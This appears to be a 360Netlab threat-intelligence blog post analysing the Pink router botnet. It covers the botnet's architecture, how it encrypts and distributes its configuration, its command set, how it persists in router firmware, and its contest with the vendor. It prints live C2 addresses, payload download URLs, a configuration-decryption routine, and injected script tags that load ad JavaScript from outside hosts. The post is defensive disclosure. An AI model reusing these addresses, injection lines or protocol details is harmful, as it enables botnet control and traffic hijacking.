    "plain_text": "# Pink, a botnet that competed with the vendor to control the massive infected devices\n\n**blog.netlab.360.com/pink-en/**\n\n360Netlab October 29, 2021\n\n29 October 2021\nMost of the following article was completed around early 2020, at that time the vendor was\ntrying different ways to recover the massive amount of infected devices, we shared our\nfindings with the vendor, as well as to CNCERT, and decided to not publish the blog while the\nvendor's working was in progress. Last week, CNCERT finally disclosed this botnet, and we\nhave learned that the infected devices have “mostly” been taken care of, so here we are..\n\n## Overview\n\nOn November 21, 2019, we got an interesting new botnet sample from the security\ncommunity, the sample contained a large number of function names starting with “pink”, and\nwe named it pink botnet.\n\nPink is the largest botnet we have first hand observed in the last six years, during peak time,\nit had a total infection of over 1.6 million devices (96% are located in China) Pink targets\nmainly mips based fiber router, and has very strong and robust architecture, it uses a\ncombination of third-party services, P2P and central C2s for its’ bots to controller\ncommunications, and has complete verification of the C2 communications, doing this\nensures that the bot nodes will not be easily cut off or taken over Pink raced with the vendor\nto retain control over the infected devices, while vendor made repeated attempts to fix the\nproblem, the bot master noticed the vendor’s action also in real time, and made multiple\nfirmware updates on the fiber routers corresponsly.\n\nPink adopts DNS-Over-HTTPS protocol, which is also not typical.\n\n## Scale and Impact\n\nWe have infection numbers from three differentness sources, they are:\n\n1. 2019-11-30 A trusted security partner in US informed us they saw 1,962,308 unique\n\ndaily active IPs from this botnet hitting them.\n2. 2020-01-02 CNCERT shared us the following note\n```\n\"From the data measured in multiple dimensions such as NetFlow data, active\nprobing, and real-time monitoring, the number of Bot node IP addresses\nassociated with this botnet exceeds 5 million. As home broadband IPs are\ndynamically assigned, the true size of the infected devices behind them\n\n```\n\n-----\n\n```\ncannot be accurately estimated, and it is presumed that the actual number of\ninfected devices is in the millions. One of the main bases of the\nmeasurement is that the number of IPs connected to C2 in one minute was well\nover one million.\"\n\n```\n1. 2020-01-08 Our (360NetLab) assessment based on continuous network-wide probing\n\ngave us the the number of 1.65 million. The infected IPs are concentrated in China\n(96%), spanning 33 provinces across the country. Affected carriers involve China\nUnicom (>80%) and China Telecom (>15%).\n\n## Pink Architecture\n\nPink is a hybrid architecture botnet that uses both \"P2P\" and central “C2\" to communicate to\nits bots . In general, it delivers less time-sensitive commands (e.g. management\nconfiguration information) via P2P, while more time-sensitive commands are distributed\ncentrally via the C2s (e.g. launching ddos attacks, inserting advertisements into HTTP\nwebsites visited by users).\n\n## Configuration information\n\nOne key step for every Bot is to find the controller. The controller information is contained in\nthe \"configuration\", and the following is the latest configuration we intercepted.\n```\n{\n \"verify\": \"1585065675\",\n \"cncip1\": \"144.202.109.110\",\n \"cncport1\": \"32876\",\n \"dlc\": \"5b62596bc1453d51cc7241086464f294\",\n \"dl\": \"http【:】//155.138.140.245/dlist.txt\",\n \"dlc1\": \"484417e6f65c8e18e684d60c03c4680a\",\n \"dl1\": \"https【:】//*****.com/johncase/zip/raw/master/dlist.txt\",\n \"sd0\": \"1.1.1.1\",\n \"sdp0\": \"443\",\n \"srvk\": \"FJAz37XiKgnTLtVpmhjxZcavTJUU5r4XN3Wl5nhTpg0=\",\n \"pxy\": \"1\"\n}\n\n```\n1. The verify field is the timestamp when the command is issued, and the Bot will get the\n\nlatest valid commands based on this timestamp.\n\n2. The subsequent cncip and cncport fields specify the latest C2 address of the botnet,\n\nand the attacker can switch this control address easily at any time.\n\n3. The subsequent \"dlc/dl\" and \"dlc1/dl1\" field groups are the latest Bot update addresses,\n\nwhere dlc and dlc1 are the corresponding content Hash check fields, and the algorithm\npseudo-code is: `MD5(MD5( dlist_content)+SHA256(dlist_content)) .`\n\n\n-----\n\n4. The sd0/sdp0 field is the secure DNS server address. For each Bot, when a DNS\n\nresolution record needs to be queried, it will check the DNS service specified here\nusing `DNS-Over-HTTPS .`\n\n5. The srvk field is the public key content (base64 encoding) of the server side. For each\n\nbot, its communication with CNC is encrypted. So a unique private key has to be\nobtained through ECDH key negotiation before the actual communication. After\nspecifying the public key on the CNC side here, it also completes the verification of the\nBot's identity to the CNC by the way. This is an extension of the original ECDH.\n\n6. The pxy field is presumably an option for the proxy usage. There is no sign of its being\n\nused, and it is not clear how the logic works.\n\n### Protection of configuration information\n\nAfter reading the previous section, it is easy to see that the \"configuration information\" is\nactually the core of the botnet, which guarantees the attacker’s absolute control over the\nbotnet.\n\nTo prevent others from discovering the configuration information, the configuration is\nencrypted. The decryption algorithm is symmetric, and the decryption code logic is as\nfollows.\n```\ndef easydecrpyt(message):\n  res = \"\"\n  for cursor in range(0, len(message)):\n    mbt = ord(message[cursor])\n    res += (chr((mbt ^ (cursor%0xff) ^ 0xae ^ 0xac ^ 0xbe ^ 0xef) & 0xff))\n  return res\n\n```\nThe bot master also signed the configuration information using ecdsa to make sure no one\ncan mess with the message, with the following signature details.\n\n1. The cryptographic library used for signature verification is `mbedtls .`\n\n2. The signature algorithm is `ECDSA .`\n\n3. The curve used for the signature is: `MBEDTLS_ECP_DP_SECP192R1 .`\n\n4. The public key used for signature checking is: `04 8D 54 71 71 44 A0 61 DA 5A B4`\n```\n   EA 40 55 2F 21 B1 9B 6C A5 17 92 0F 10 B5 11 56 ED 14 DB 54 47 1A 94 48\n   06 06 3C 7A B4 3B 25 D1 AC 9F 85 AF 33 9E\n\n### Distribution of Configuration Information\n\n```\n\n-----\n\nIn addition to ensuring the confidentiality and integrity of the configuration information, the\nbot master also uses several means to distribute the configuration information to ensure its\navailability.\n\n**a) Distribution of configuration information through third-party services**\n\n_1. Distribution of configuration information via BTC+GITHUB_\n\nThe core of this distribution channel is a project hidden on GITHUB, the most recently seen\nproject is (mypolo111/vfg), and you can see two lines in the README of this project.\n\nWhere the pattern is `P!!! <base64>I!!! line is the configuration signature and the`\nschema is `N!!! <base64>K!!! line is the ciphertext of the configuration information.`\n\nHowever, for each Bot, trying to find this hidden item is a multiple steps process:\n\nStep 1: A topic tag was first generated from the transfer record of a fixed BTC wallet\n\n[1GQNam6xhzYVLWWXvRfu3EjsFon6n6GxMF], (after reversing the sample, I reverted the\nprocess as shown below, the query of the BTC wallet uses four web services, and the\nspecific addresses are also shown in the figure).\n\n\n-----\n\nStep 2: For each of the possible topic tags, there are many related github projects. Going\nthrough the ISSUES of these projects and looking for a file with the format `...!`\n```\n<base64>...? String,when a match is located, restoring the base64 will give you the\n\n```\naddress (for example, the most recent one we found is `...!L215cG9sbzExMS92Zmc=...?`\nBy restoring this base64, the address of the hidden item is `mypolo111/vfg )`\n\nStep 3: Searching GITHUB Topics and ISSUES to find the hidden GIT project.\n\nPS: `mypolo111 has submitted ISSUES in several projects, the relevant`\nscreenshots are shown below.\n\n\n-----\n\nImportant note here: With these set of addressing logic above, the bot master can easily\nswitch the real GITHUB project address by adding transaction records to a specific BTC\nwallet. In such a case, the specified BTC wallet must be blocked in order to disrupt the\nGITHUB-based distribution logic of the botnet, or else the defender would just be playing\nwhack a mole.\n\n_2. Distribution of configuration information through a Chinese website_\n\nIn a few samples, the bot master also distributed configuration information via a website in\nChina, using similar logic to that of GITHUB distribution.\n\n**b) Distribution of configuration information via P2P**\n\nTwo methods are supported here:\n\n1. P2P-Over-UDP123 distribution\n\nFor this method, when the bot starts, it will listen to the UDP-123 port, which is originally the\ndefault port of NTP service, doing this might trick some users to think this is just a normal\nNTP service and nothing needs to be looked here. Then it will launch a Peer probe request\nto four B-segment addresses on the public network ( \"114.25.0.0/16\",\n```\n\"36.227.0.0/16\", \"59.115.0.0/16\", \"1.224.0.0/16\" ) with the content 1C 00 00\n00 .\n\n```\nWhen the target is a real NTP server it will respond with NTP time, while if the target is\na bot node, two possible responses are expected.\nIf the target Bot does not have the c2 information it will respond with `1D 00 00 00`\nWhen the target Bot has already gotten the C2 information, it replies with the signature\nof the C2 information and the corresponding cipher text, and before sending, 0xE3 will\nbe added to the message header.\n\nThe following figure shows the recently captured configuration information via UDP-123.\n\n\n-----\n\n**c) Distribution of configuration information via C2**\n\nThe attacker has a domain name cnc.pinklander.com built into some of the samples. When\nthe domain name is enabled, a web page is displayed with the same content as the GITHUB\nproject. It is also the base64 encoded configuration information.\n\n## PinkBot Command\n\n**Command Format**\n\nEach command contains at least 7 bytes, and the meaning is as follows.\n\n1. Token field, 4 bytes long, the value of this field is specified by the server and will be\n\nused all the time after it is specified. When the server side accepts it, it will assign a\nToken value to the Bot, which is considered successful.\n2. Command field, length 1 byte, after C2 sends out the command, Bot should return the\n\nexecution result with the same command code.\n\n\n-----\n\n3. Content length field, 2 bytes in length. When the instruction does not contain specific\n\ncontent, it is set to zero, otherwise it is filled with the number of bytes of content length\nand appended with the cipher content.\n4. Instruction. When the instruction contains content, this field is filled with the instruction\n\ncontent of the cipher text. See below for decryption method.\n\nHere is a screenshot for reference, where the instruction field is marked in red.\n\n### Instruction communications\n\n**a) Encryption**\n\nThe cncip1 and cncport1 in the above configuration information are the actual C2 nodes\nused by the attacker. The communication details are as follows.\n\n1. The cryptographic library used is: `mbedtls ;`\n\n\n-----\n\n2. The exchange algorithm used in the key exchange phase is ecdh, and the loading\n\ncurve is `MBEDTLS_ECP_DP_CURVE25519 ;`\n3. The server-side ECDH public key is hard-coded in the samples in the early stages of\n\ndevelopment, and later on, it is changed to be specified in the configuration\ninformation. However, the content has not changed so far: `14 90 33 DF B5 E2 2A`\n\n```\n09 D3 2E D5 69 9A 18 F1 65 C6 AF 4C 95 14 E6 BE 17 37 75 A5 E6 78 53 A6\n\n```\n```\n   0D\n\n```\n4. The algorithm used in the encryption/decryption phase of the message is\n\nAES, the key is the secret after key exchange, and the loading parameters are\n```\n   MBEDTLS_AES_ENCRYPT and MBEDTLS_AES_DECRYPT ;\n\n```\n5. For ECDH, generally the public and private keys of both parties are regenerated every\n\ntime. In Pink, however, only the Bot side is required to be different each time, while the\nserver side specifies a fixed pair of public-private keys. This built-in server-side public\nkey is equivalent to giving the Bot the ability to authenticate the CNC, thus eliminating\nthe possibility of man-in-the-middle attacks.\n\n**b) Instruction Content**\n\nIn order to adapt to the different distribution of byte sequences in mipsb/mipsl models at the\nsame time, the transmitted content is transformed by the open source library nanopb, which\ncan abstract the serialization and deserialization process by agreeing on a template, thereby\nignoring the interference of big/little endian memory.\n\n### The instructions\n\nThe Pink instruction has a rich set of controls.\n\n1. File download\n2. System command execution\n3. DDoS attacks (HTTP attacks and UDP attacks)\n4. Scan(the specifics of the scan can be set by the command)\n5. Report device information (CPU / system type / memory information / system\n\nversion / hardware information)\n6. Self-update (save new version to /tmp/client and then run)\n7. P2P node list synchronization (push a set of P2P nodes directly to the Bot)\n8. Http message injection (on the victim device, advertising js scripts will be injected\n\nwhen traffic type is http)\n9. Sock5 proxy service (set up Socks5 proxy service on Bot side, account password\n\nset by command)\n10. Download the file and execute\n\n11. Stop the attack\n12. Reset watchdog\n\n## PinkBot persistence method\n\n\n-----\n\nUnlike other the botnets we commonly see, Pink will flash the original firmware of the fiber\nrouter after infecting it in order to maintain absolute controls. In the rewritten firmware,\nPinkBot's downloader c2 and the supporting bootloader are included.\n\nThe following figure shows the list of files added/modified by Pink.\n\nThe tmp directory can be ignored, as it contains temporary files generated when the sample\nruns.\n\nKey file descriptions.\n\n/bin/protect: `md5:9ec5bd857b998e60663e88a70480b828`\n\nThe protect file is actually more like a downloader, in the sample you can see codes that\nsupport above-mentioned 5 methods to get configuration information. The main function is to\nget the latest samples from the configuration information and start them up.\n\n/bin/tr69c: `md5:451a3cf94191c64b5cd1be1a80be7799`\n\n\n-----\n\nThe tc69c file is a patch version of tr69c of the original firmware of the fiber router. It removes\nthe update function from the firmware, which basically makes it impossible to update the\nfirmware through tr69c.\n\n## Command Tracking\n\nWe simulated PinkBot node to receive commands distributed by the C2 in real time. In\naddition to the daily maintenance-type instructions (heartbeat instructions/peerlist\nsynchronization instructions), we also received several instructions to insert advertisements\nto WEB pages, such as:\n```\n<script async src=\"http【:】//45.32.21.251/j/?$$\"></script>\n<script async src=\"http【:】//167.179.80.159/j/?$$\"></script>\n<script async src=“http【:】//114.55.124.13/j/?$$“></script>\n\n```\nWe have noticed that the configuration information for pink changes intermittently, mainly in\nthe CNC and DL* fields, and it has stabilized in recent months. Below is the latest\nconfiguration information we captured on 2021/10/5 (BST).\n```\n{\n \"verify\":\"1611936001\",\n \"cncip1\":\"140.82.40.29\",\n \"cncport1\":\"26007\",\n \"dlc\":\"450aa79da035a8a55ca4c0e6b1025b50\",\n \"dl\":\"http://209.250.247.60/dlist.txt\",\n \"dlc1\":\"47ed94977b45099f1ef5c7701b2d25dc\",\n \"dl1\":\"https://****.com/****/dlist.txt\",\n \"sd0\":\"1.1.1.1\",\n \"sdp0\":\"443\",\n \"srvk\":\"FJAz37XiKgnTLtVpmhjxZcavTJUU5r4XN3Wl5nhTpg0=\",\n \"pxy\":\"1\"\n}\n\n## Current Size\n\n```\nAs mentioned earlier, Pink uses P2P to distribute non-real-time command information. Using\nthis feature, we were able to evaluate the number of PinkBot infections on a global basis.\nThe major vendor has been exploring all possible methods to eliminate infected devices and\nthe infection number has dropped significantly. While at the same time, there are still a good\namount of infected units out there, on 2021/10/20, we still see 103024 daily active IPs.\n\n## DDoS attacks\n\nDDos does not seem to be a big thing with Pink, we have seen Pink launching around 100\nDDos attacks all together, for example:\n```\n2020/3/24 UDP-DDoS, Victim 203.56.252.137:26999\n2020/4/8 HTTP-DDoS, Victim 180.101.192.199:27020\n\n```\n\n-----\n\n## Extra: Pink s turf war\n\nIn the process of analyzing and tracking the Pink botnet. We noticed that the bot master and\nvendor have conducted several offensive and defensive cyber wars.\n\n**Round 0: According to information provided by one major vendor involved, the confrontation**\nfirst occurred in mid-November 2019. The vulnerability under attack originated from a TCP17998 control service, which is an interface provided to operators to the device. Due to a\nmisconfiguration and implementation of the service, access was opened to the public\nnetwork, through which the attacker gained control of the relevant fiber routers.\n\n**Round 1: After discovering this problem, the vendor started to try to fix its own device**\nthrough the same vulnerability on the public network. However, it was soon discovered and\nimmediately acted upon by the bot master, who shut down the TCP-17998's extranet access\nvia iptables, preventing further fixes by the vendor using this method.\n\n**Round 2: This time the attack and defense focused on the tr069 upgrade channel. The**\nvendor from the operator side can use tr096 to get in and repair the device when the unit\nboots up. However, the attacker had great visibility and quickly updated the firmware to turn\noff the tr096 update channel.\n\n**Round 3: Now the vendor tried to use the TCP-80 HTTP service on the LAN side of the**\ndevice to repair the device, however, the attacker quickly noticed what was going on and\nupdated the firmware again to take out the HTTP service file on the device. At this point, all\ndevices have no control plane for the vendor to provide management service.\n\n**The finally: The only option left for the vendor to dispatch people to the end customers to**\nphysically access the fiber router, disassemble the debugging interface or simply replace the\nunit.\n\n**Our take: The bot master easily got an upper hand in multiple rounds of offensive and**\ndefensive confrontations, the vendor had no control and no visibility to where the devices\nare, how many of them are infected and what was going on on these devices and had no\nway to easy access the devices. On the other hand, the bot master had full visibility and full\ncontrol over the infected devices and could issue whatever service command such as\nblocking ports, removing services through the centralized C2 in real time.\n\n## Extra2 more about GITHUB action\n\nWe traced back the Pink and found out that its first existence went back as early as October\n16, 2018, at that time the Github account used was pink78day (this account is not exist now,\nseet Google snapshot here).\n\n\n-----\n\nThe account currently used by PinkBot is mypolo111 registered in late November 2019, and\npink78day is no longer searchable on Github.\n\nNote here as we mentioned before pink78day is not used as a centralized channel for\ndistributing instructions, so simply blocking this account would have no real effect.
